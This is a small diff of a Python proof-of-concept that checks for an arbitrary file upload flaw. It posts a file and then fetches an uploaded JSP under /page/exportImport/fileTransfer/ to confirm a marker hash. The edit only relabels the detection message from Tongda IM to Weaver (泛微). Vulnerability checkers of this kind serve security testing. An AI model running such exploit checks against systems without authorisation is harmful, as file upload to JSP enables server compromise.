@@ -9,6 +9,6 @@ def poc(target):
         res = requests.post(upload_url, headers=headers, data=data)
         res1 = requests.get(target + "/page/exportImport/fileTransfer/test123.jsp")
         if "202cb962ac59075b964b07152d234b70" in res1.text and res1.status_code == 200:
-            print("\033[0;31m 存在通达im任意文件上传漏洞："+upload_url)
+            print("\033[0;31m 存在泛微任意文件上传漏洞："+upload_url)
     except:
         pass
